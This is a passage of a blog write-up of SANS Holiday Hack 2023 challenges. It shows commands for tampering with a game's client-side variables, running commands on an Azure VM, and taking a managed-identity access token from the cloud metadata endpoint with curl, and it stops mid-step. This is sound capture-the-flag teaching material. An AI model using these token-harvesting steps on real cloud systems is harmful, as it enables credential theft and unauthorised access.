@@ -1,0 +1,1298 @@
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Some SANS Holiday Hack 2023 Solutions</title>
+<link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.121.2"><meta name=twitter:card content="summary"><meta name=twitter:title content="Some SANS Holiday Hack 2023 Solutions"><meta name=twitter:description content="As is tradition, I started the SANS Holiday Hack and this time I almost did everything.
+Previous years' writeups: /categories/holiday-hack/.
+Holiday Hack Orientation Picked up the fishing pole.
+Cranberry Pi: Type answer.
+Linux 101 Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.
+You have to run a few commands to find the trolls."><meta name=twitter:domain content="parsiya.net"><meta name=twitter:creator content="@CryptoGangsta"></head><body><header role=banner><hgroup><h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
+complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation><fieldset class=mobile-nav><select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select></fieldset><ul class=main-navigation><li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription><a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a></ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer"><fieldset role=search><input class=search type=text name=q results=0 placeholder=Search>
+<input type=hidden name=q value=site:https://parsiya.net/></fieldset></form></nav><div id=main><div id=content><div><article class=hentry role=article><header><p class=meta>Jan 10, 2024
+- 34 minute read
+- <a href=https://parsiya.net/blog/sans-holiday-hack-2023/#disqus_thread>Comments</a>
+- <a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/holiday-hack/>Holiday Hack</a></p><h1 class=entry-title>Some SANS Holiday Hack 2023 Solutions</h1></header><div class=entry-content><nav id=TableOfContents><ul><li><a href=#holiday-hack-orientation>Holiday Hack Orientation</a></li><li><a href=#linux-101>Linux 101</a></li><li><a href=#snowball-fight>Snowball Fight</a></li><li><a href=#reportinator>Reportinator</a></li><li><a href=#azure-101>Azure 101</a></li><li><a href=#certificate-sshenanigans>Certificate SSHenanigans</a><ul><li><a href=#list-all-subscriptions>List all subscriptions</a></li><li><a href=#list-all-resource-groups>List all Resource Groups</a></li><li><a href=#red-herring---github-repo>Red Herring - GitHub Repo</a></li><li><a href=#red-herring-2---login-as-alabaster>Red Herring 2 - Login as Alabaster</a></li></ul></li><li><a href=#elf-hunt>Elf Hunt</a></li><li><a href=#active-directory>Active Directory</a></li><li><a href=#faster-lock-combination>Faster Lock Combination</a></li><li><a href=#the-captains-comms>The Captain's Comms</a></li><li><a href=#linux-privesc>Linux PrivEsc</a></li><li><a href=#hashcat>Hashcat</a></li><li><a href=#luggage-lock>Luggage Lock</a></li><li><a href=#naan>Na'an</a></li><li><a href=#phish-detection-agency>Phish Detection Agency</a></li><li><a href=#kql-kraken-hunt>KQL Kraken Hunt</a><ul><li><a href=#onboarding>Onboarding</a></li><li><a href=#case-1>Case 1</a></li><li><a href=#case-2>Case 2</a></li><li><a href=#case-3>Case 3</a></li><li><a href=#case-4>Case 4</a></li><li><a href=#case-5>Case 5</a></li><li><a href=#case-6>Case 6</a></li><li><a href=#final>Final</a></li></ul></li><li><a href=#space-island-door-access-speaker>Space Island Door Access Speaker</a></li><li><a href=#game-cartridges-vol-1>Game Cartridges: Vol 1</a></li></ul></nav><p>As is tradition, I started the SANS Holiday Hack and this time I almost did
+everything.</p><p>Previous years' writeups:
+<a href=/categories/holiday-hack/>/categories/holiday-hack/</a>.</p><h1 id=holiday-hack-orientation>Holiday Hack Orientation
+<a class=header-link href=#holiday-hack-orientation><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Picked up the fishing pole.</p><p>Cranberry Pi: Type <code>answer</code>.</p><h1 id=linux-101>Linux 101
+<a class=header-link href=#linux-101><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with
+some basic Linux tasks. It's in the southwest corner of Frosty's Beach.</p></blockquote><p>You have to run a few commands to find the trolls.</p><pre tabindex=0><code>ls
+cat troll_19315479765589239
+rm troll_19315479765589239
+pwd
+ls -alt
+cat .bash_history
+printenv
+cd workshop
+grep -ir &#34;troll&#34;
+chmod +x present_engine 
+./present_engine 
+cd /home/elf/workshop/electrical
+mv blown_fuse0 fuse0
+ln -s fuse0 fuse1
+cp fuse1 fuse2
+echo &#34;TROLL_REPELLENT&#34; &gt; fuse2
+cd /opt/troll_den
+find . -iname &#34;*troll*&#34;
+find . -group troll
+find . -size +108k -size -110k
+ps -aux
+netstat -napt
+curl localhost:54321 # wget was not on the system
+kill -9 6224 # process&#39; pid
+</code></pre><h1 id=snowball-fight>Snowball Fight
+<a class=header-link href=#snowball-fight><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Visit Christmas Island and talk to Morcel Nougat about this great new game.
+Team up with another player and show Morcel how to win against Santa!</p></blockquote><p>Might be able to use it in solo mode (by tinkerting client-side variables).</p><p><code>gameType = "solo"</code> changes the snowball color but it was not right. The options
+were <code>co-op</code> and <code>free-for-all</code>.</p><pre tabindex=0><code>elfThrowDelay # 2000
+
+playersHitBoxSize # maybe we can change it to all zeros
+(4) [30, 30, 40, 60]
+
+santaHitBoxSize = [200,200,200,200]
+playersHitBoxSize = [1,1,1,1]
+
+singlePlayer # change to true? - it&#39;s a string
+&#39;false&#39;
+
+santaThrowDelay # change it to higher
+500
+
+window.location.href
+
+&#39;https://hhc23-snowball.holidayhackchallenge.com/room/?username=parsiya&amp;roomId=190d57f7f&amp;roomType=private&amp;gameType=co-op&amp;id=...&amp;dna=...&amp;singlePlayer=false&#39;
+
+# the URL has gameType &#34;co-op&#34; and singlePlayer=false
+# what if we changed it to gameType=solo and singlePlayer=true
+# gameType=solo is wrong. I can only see `free-for-all` and `co-op` in code.
+
+# the ball color changes and the page reloads but no enemies show up
+# maybe we have to modify roomType
+</code></pre><p>All the variables are set in the page's JavaScript.</p><p><code>gameType=co-op&amp;singlePlayer=true</code></p><p>makes "elf the dwarf" join the game. This is probably what <code>elfThrowDelay</code> means</p><p><a href="https://hhc23-snowball.holidayhackchallenge.com/room/?username=parsiya&amp;roomId=891de62b&amp;roomType=private&amp;gameType=co-op&amp;id=...&amp;dna=...&amp;singlePlayer=true" target=_blank rel="noreferrer noopener">https://hhc23-snowball.holidayhackchallenge.com/room/?username=parsiya&roomId=891de62b&roomType=private&gameType=co-op&id=...&dna=...&singlePlayer=true</a></p><p>We have to wait a bit for the game to start.
+And then kill Santa.</p><hr><p>Had to go and talk to Santa again. I missed it because he would start from
+scratch. He said to go to a different place but doesn't tell you where.</p><p>I had to go right for a moderate amount of time to get to Rudloph's Rest. Seems
+like Santa doesn't send you there. You have to use the bottom-left minimap to
+navigate the waters.</p><h1 id=reportinator>Reportinator
+<a class=header-link href=#reportinator><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and
+help him clean it up.</p></blockquote><p>Just go through them and figure out which ones are LLM hallucinations. These are
+usually big errors. For example, <code>HTTP SEND</code>, <code>HTTP 7.4.33</code>, port <code>88555/TCP</code>.</p><h1 id=azure-101>Azure 101
+<a class=header-link href=#azure-101><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Help Sparkle Redberry with some Azure command line skills. Find the elf and
+the terminal on Christmas Island.</p></blockquote><p>Reference index: <a href="https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest" target=_blank rel="noreferrer noopener">https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest</a></p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>az help | less
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>az account show | less
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;environmentName&#34;</span>: <span style=color:#2aa198>&#34;AzureCloud&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;2b0942f3-9bca-484b-a508-abdae2db5e64&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;isDefault&#34;</span>: <span style=color:#cb4b16>true</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;northpole-sub&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;state&#34;</span>: <span style=color:#2aa198>&#34;Enabled&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;tenantId&#34;</span>: <span style=color:#2aa198>&#34;90a38eda-4006-4dd5-924c-6ca55cacc14d&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;user&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;northpole@northpole.invalid&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;type&#34;</span>: <span style=color:#2aa198>&#34;user&#34;</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>az group list
+</span></span><span style=display:flex><span>[
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;location&#34;</span>: <span style=color:#2aa198>&#34;eastus&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;managedBy&#34;</span>: <span style=color:#cb4b16>null</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;northpole-rg1&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;properties&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;provisioningState&#34;</span>: <span style=color:#2aa198>&#34;Succeeded&#34;</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;tags&#34;</span>: {}
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;location&#34;</span>: <span style=color:#2aa198>&#34;westus&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;managedBy&#34;</span>: <span style=color:#cb4b16>null</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;northpole-rg2&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;properties&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;provisioningState&#34;</span>: <span style=color:#2aa198>&#34;Succeeded&#34;</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;tags&#34;</span>: {}
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>az functionapp list -g northpole-rg<span style=color:#2aa198>1</span> | less
+</span></span><span style=display:flex><span><span style=color:#586e75>// too big to list
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span>az vm list -g northpole-rg<span style=color:#2aa198>1</span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// no access
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span>az vm list -g northpole-rg<span style=color:#2aa198>2</span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// works
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>[
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2/providers/Microsoft.Compute/virtualMachines/NP-VM1&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;location&#34;</span>: <span style=color:#2aa198>&#34;eastus&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;NP-VM1&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;properties&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;hardwareProfile&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;vmSize&#34;</span>: <span style=color:#2aa198>&#34;Standard_D2s_v3&#34;</span>
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;provisioningState&#34;</span>: <span style=color:#2aa198>&#34;Succeeded&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;storageProfile&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;imageReference&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;offer&#34;</span>: <span style=color:#2aa198>&#34;UbuntuServer&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;publisher&#34;</span>: <span style=color:#2aa198>&#34;Canonical&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;sku&#34;</span>: <span style=color:#2aa198>&#34;16.04-LTS&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;version&#34;</span>: <span style=color:#2aa198>&#34;latest&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;osDisk&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;caching&#34;</span>: <span style=color:#2aa198>&#34;ReadWrite&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;createOption&#34;</span>: <span style=color:#2aa198>&#34;FromImage&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;managedDisk&#34;</span>: {
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>&#34;storageAccountType&#34;</span>: <span style=color:#2aa198>&#34;Standard_LRS&#34;</span>
+</span></span><span style=display:flex><span>          },
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;VM1_OsDisk_1&#34;</span>
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;vmId&#34;</span>: <span style=color:#2aa198>&#34;e5f16214-18be-4a31-9ebb-2be3a55cfcf7&#34;</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;resourceGroup&#34;</span>: <span style=color:#2aa198>&#34;northpole-rg2&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;tags&#34;</span>: {}
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>az vm run-command list -g northpole-rg<span style=color:#2aa198>2</span> -n NP-VM<span style=color:#2aa198>1</span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// returned the same output as above
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span>az vm run-command invoke -g northpole-rg<span style=color:#2aa198>2</span> -n NP-VM<span style=color:#2aa198>1</span> --command-id RunShellScript --scripts <span style=color:#2aa198>&#34;ls&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;value&#34;</span>: [
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;code&#34;</span>: <span style=color:#2aa198>&#34;ComponentStatus/StdOut/succeeded&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;displayStatus&#34;</span>: <span style=color:#2aa198>&#34;Provisioning succeeded&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;level&#34;</span>: <span style=color:#2aa198>&#34;Info&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;message&#34;</span>: <span style=color:#2aa198>&#34;bin\netc\nhome\njinglebells\nlib\nlib64\nusr\n&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;time&#34;</span>: <span style=color:#2aa198>1702263948</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;code&#34;</span>: <span style=color:#2aa198>&#34;ComponentStatus/StdErr/succeeded&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;displayStatus&#34;</span>: <span style=color:#2aa198>&#34;Provisioning succeeded&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;level&#34;</span>: <span style=color:#2aa198>&#34;Info&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;message&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;time&#34;</span>: <span style=color:#2aa198>1702263948</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  ]
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>One of the hints after finishing the challenge is this URL (it's supposedly
+interesting). It shows a web portal where we can paste an SSH public key and get
+an SSH certificate.</p><p><a href="https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl" target=_blank rel="noreferrer noopener">https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl</a></p><p>Also a link and hint to Azure REST APIs if cli is not available:
+<a href=https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token target=_blank rel="noreferrer noopener">https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token</a></p><h1 id=certificate-sshenanigans>Certificate SSHenanigans
+<a class=header-link href=#certificate-sshenanigans><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate
+configuration and Azure Function App. What type of cookie cache is Alabaster
+planning to implement?</p></blockquote><p>Function App: <a href="https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl" target=_blank rel="noreferrer noopener">https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl</a></p><p>Pixel Island is in the top right. We go there and see <code>Rainmaster Cliffs</code>.</p><blockquote><p>I could use your help with my fancy new Azure server at
+ssh-server-vm.santaworkshopgeeseislands.org.</p><p>It even generated ready-to-deploy code for an Azure Function App so elves can
+request their own certificates. What a timesaver!</p><p>Generate yourself a certificate and use the monitor account to access the
+host. See if you can grab my TODO list.</p><p>Oh, and if you need to peek at the Function App code, there's a handy Azure
+REST API endpoint which will give you details about how the Function App is
+deployed.</p></blockquote><p>Important notes:</p><ul><li>Use the <code>monitor</code> account.</li><li>Create a certificate and upload the public key to the portal so you can use it to SSH?</li><li>Where does Azure REST APIs come into play?</li></ul><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#586e75>// generate a key
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>ssh-keygen -C <span style=color:#2aa198>&#34;monitor&#34;</span> -f monitor
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// we will get two files monitor and monitor.pub
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// use the public key to get a signed cert
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;ssh_cert&#34;</span>: <span style=color:#2aa198>&#34;rsa-sha2-512-cert-v01@openssh.com [removed]&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;principal&#34;</span>: <span style=color:#2aa198>&#34;elf&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// rename the old public key
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>mv monitor.pub monitor.old
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// use the signed cert from the server as the new public key, paste it in monitor.pub
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// login as monitor - note we&#39;re passing the private key here
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i monitor
+</span></span></code></pre></div><p>We will see a <code>Satellite Tracking Interface</code>. Press <code>ctrl+c</code> to go into a CLI.
+It's run via <code>~/.bashrc</code>.</p><pre tabindex=0><code># Start SatTrackr
+/usr/local/bin/sattrackr
+</code></pre><p>This is where we have to use curl and get info through the Azure REST API.</p><p>We need a token that we can get using this
+<a href=https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token target=_blank rel="noreferrer noopener">https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token</a></p><p>GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' HTTP/1.1 Metadata: true</p><p>Shouldn't change the resource.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>$ curl <span style=color:#2aa198>&#34;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/&#34;</span>\
+</span></span><span style=display:flex><span>    -H <span style=color:#2aa198>&#34;Metadata: true&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;access_token&#34;</span>: <span style=color:#2aa198>&#34;[removed]&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;client_id&#34;</span>: <span style=color:#2aa198>&#34;b84e06d3-aba1-4bcc-9626-2e0d76cba2ce&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;expires_in&#34;</span>: <span style=color:#2aa198>&#34;85606&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;expires_on&#34;</span>: <span style=color:#2aa198>&#34;1702417629&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;ext_expires_in&#34;</span>: <span style=color:#2aa198>&#34;86399&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;not_before&#34;</span>: <span style=color:#2aa198>&#34;1702330929&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;resource&#34;</span>: <span style=color:#2aa198>&#34;https://management.azure.com/&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;token_type&#34;</span>: <span style=color:#2aa198>&#34;Bearer&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>We have an access token. We can pass it in curl to get the code for the app.
+Instead of passing it every time, we put it in a curl config file like this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#586e75># cfg</span>
+</span></span><span style=display:flex><span>-H <span style=color:#2aa198>&#34;Authorization: bearer [token from above]&#34;</span>
